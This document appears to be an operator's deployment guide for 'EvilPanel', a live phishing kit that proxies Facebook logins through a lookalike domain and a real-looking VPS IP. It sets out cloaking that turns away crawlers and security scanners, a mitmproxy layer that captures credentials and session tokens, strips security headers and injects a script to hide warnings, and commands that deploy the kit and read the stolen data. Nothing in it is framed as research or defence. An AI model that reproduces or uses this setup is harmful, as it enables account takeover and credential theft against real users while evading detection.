# EvilPanel VPS Deployment Guide

## Quick Start

### From Local Machine:
```bash
cd /home/haymayndz/maxphisher2-clean/evilpanel/deploy
chmod +x upload.sh
./upload.sh
```

### On VPS:
```bash
ssh root@206.189.92.6
cd /opt/evilpanel/deploy
chmod +x deploy.sh verify.sh
./deploy.sh
./verify.sh
```

## Prerequisites

- [x] Domain: `frontnews.site` configured in Cloudflare
- [x] Cloudflare SSL Mode: Full (Strict)
- [x] VPS IP: `206.189.92.6`
- [x] DNS A records pointing to VPS IP:
  - `frontnews.site` → `206.189.92.6`
  - `m.frontnews.site` → `206.189.92.6`
  - `www.frontnews.site` → `206.189.92.6`

## Deployment Phases

| Phase | Description | Status |
|-------|-------------|--------|
| 1 | Base dependencies (nginx, python, certbot) | Auto |
| 2 | Directory structure | Auto |
| 3 | SSL certificate (Let's Encrypt) | Auto |
| 4 | Python virtual environment + mitmproxy | Auto |
| 5 | SQLite database initialization | Auto |
| 6 | Nginx configuration with bot detection | Auto |
| 7 | Systemd service installation | Auto |
| 8 | Firewall configuration | Auto |
| 9 | Verification tests | Auto |

## Cloaking Architecture

```
                    ┌─────────────────────────────────────────┐
                    │           INCOMING REQUEST              │
                    └─────────────────┬───────────────────────┘
                                      │
                                      ▼
                    ┌─────────────────────────────────────────┐
                    │     LAYER 1: Nginx Bot Detection        │
                    │  ┌───────────────────────────────────┐  │
                    │  │ User-Agent Pattern Matching       │  │
                    │  │ - Googlebot, Bingbot, etc.        │  │
                    │  │ - curl, wget, python-requests     │  │
                    │  │ - Nessus, Nikto, SQLMap           │  │
                    │  └───────────────────────────────────┘  │
                    └─────────────────┬───────────────────────┘
                                      │
                      ┌───────────────┼───────────────┐
                      │               │               │
                      ▼               │               ▼
           ┌──────────────────┐       │    ┌──────────────────┐
           │  Bot Detected    │       │    │   Clean Request  │
           │ → 301 Facebook   │       │    │  (Real User)     │
           └──────────────────┘       │    └────────┬─────────┘
                                      │             │
                                      │             ▼
                    ┌─────────────────────────────────────────┐
                    │    LAYER 2: mitmproxy Addon Detection   │
                    │  ┌───────────────────────────────────┐  │
                    │  │ Obfuscated Pattern Matching       │  │
                    │  │ Threat Levels:                    │  │
                    │  │ - Level 0: Real User (proceed)    │  │
                    │  │ - Level 1: Bot (redirect)         │  │
                    │  │ - Level 2: Scanner (freeze)       │  │
                    │  └───────────────────────────────────┘  │
                    └─────────────────┬───────────────────────┘
                                      │
                      ┌───────────────┼───────────────┐
                      │               │               │
                      ▼               │               ▼
           ┌──────────────────┐       │    ┌──────────────────┐
           │   Threat L1-2    │       │    │  Threat Level 0  │
           │ → Block/Freeze   │       │    │  (Real User)     │
           └──────────────────┘       │    └────────┬─────────┘
                                      │             │
                                      │             ▼
                    ┌─────────────────────────────────────────┐
                    │         AiTM Proxy (mitmproxy)          │
                    │  ┌───────────────────────────────────┐  │
                    │  │ - Rewrite Host headers            │  │
                    │  │ - Capture credentials             │  │
                    │  │ - Strip security headers          │  │
                    │  │ - Capture session tokens          │  │
                    │  │ - Rewrite HTML URLs               │  │
                    │  │ - Inject warning hider script     │  │
                    │  └───────────────────────────────────┘  │
                    └─────────────────┬───────────────────────┘
                                      │
                                      ▼
                    ┌─────────────────────────────────────────┐
                    │           facebook.com                  │
                    │         (Real Facebook)                 │
                    └─────────────────────────────────────────┘
```

## Files Deployed

```
/opt/evilpanel/
├── run.py                    # Entry point
├── core/
│   ├── mitmproxy_addon.py    # Main addon with bot detection
│   └── mitmproxy_addon_v2.py # Simplified version
├── data/
│   ├── evilpanel.db          # SQLite database
│   ├── credentials.json      # Credential backup
│   ├── sessions.json         # Session backup
│   └── debug.log             # Debug logs
├── certs/
│   └── combined.pem          # SSL cert for mitmproxy
├── logs/
├── database/
│   └── schema.sql
├── phishlets/
│   └── facebook.yaml
└── deploy/
    ├── nginx-frontnews.conf
    ├── evilpanel.service
    ├── deploy.sh
    ├── verify.sh
    └── upload.sh
```

## Management Commands

### Service Control
```bash
# Status
systemctl status evilpanel
systemctl status nginx

# Restart
systemctl restart evilpanel
systemctl restart nginx

# Logs
journalctl -u evilpanel -f
tail -f /var/log/nginx/frontnews.access.log
tail -f /opt/evilpanel/data/debug.log
```

### View Captured Data
```bash
# Credentials
cat /opt/evilpanel/data/credentials.json | jq .

# Sessions
cat /opt/evilpanel/data/sessions.json | jq .

# SQLite queries
sqlite3 /opt/evilpanel/data/evilpanel.db "SELECT * FROM credentials ORDER BY captured_at DESC LIMIT 10;"
sqlite3 /opt/evilpanel/data/evilpanel.db "SELECT * FROM sessions ORDER BY captured_at DESC LIMIT 10;"
sqlite3 /opt/evilpanel/data/evilpanel.db "SELECT * FROM blocked_requests ORDER BY blocked_at DESC LIMIT 20;"
```

### Manual Testing
```bash
# Test bot blocking (should redirect to Facebook)
curl -I -A "Googlebot" https://m.frontnews.site

# Test real user (should return 200)
curl -I -A "Mozilla/5.0 (iPhone)" https://m.frontnews.site

# Test full page load
curl -s -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)" https://m.frontnews.site | head -50
```

## Troubleshooting

### mitmproxy not starting
```bash
# Check logs
journalctl -u evilpanel -n 50

# Check if port 8443 is in use
ss -tlnp | grep 8443

# Test manually
/opt/evilpanel/venv/bin/python3 /opt/evilpanel/run.py
```

### SSL certificate issues
```bash
# Check certificate
openssl s_client -connect m.frontnews.site:443 -servername m.frontnews.site

# Renew certificate
certbot renew --force-renewal

# Regenerate combined.pem
cat /etc/letsencrypt/live/frontnews.site/fullchain.pem \
    /etc/letsencrypt/live/frontnews.site/privkey.pem \
    > /opt/evilpanel/certs/combined.pem
```

### Nginx configuration errors
```bash
# Test config
nginx -t

# Check error log
tail -f /var/log/nginx/frontnews.error.log
```

## Security Notes

- Data directory (`/opt/evilpanel/data/`) is chmod 700
- Combined certificate is chmod 600
- Service runs as root (required for mitmproxy SSL)
- Bot detection patterns are obfuscated in mitmproxy_addon.py
- Debug mode can be disabled by setting `EVILPANEL_DEBUG=false`
